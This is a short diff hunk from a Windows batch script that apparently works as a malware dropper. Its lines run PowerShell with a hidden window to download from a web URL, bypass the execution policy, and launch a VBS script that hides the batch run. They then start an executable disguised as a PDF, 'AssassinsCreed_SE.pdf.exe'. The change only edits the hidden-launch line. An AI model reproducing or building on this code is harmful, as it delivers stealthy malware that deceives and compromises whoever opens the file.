@@ -45,7 +45,7 @@ powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://gi
 @rem copy $startup/AssassinsCreed_SE.pdf.exe $currentDir/AssassinsCreed_SE.pdf.exe
 
 @rem Use VBS script to run batch file hidden
-powershell -windowstyle hidden -ExecutionPolicy Bypass ./RunHidden.vbs
+powershell powershell.exe -windowstyle hidden -ExecutionPolicy Bypass ./RunHidden.vbs
 
 start AssassinsCreed_SE.pdf.exe
 
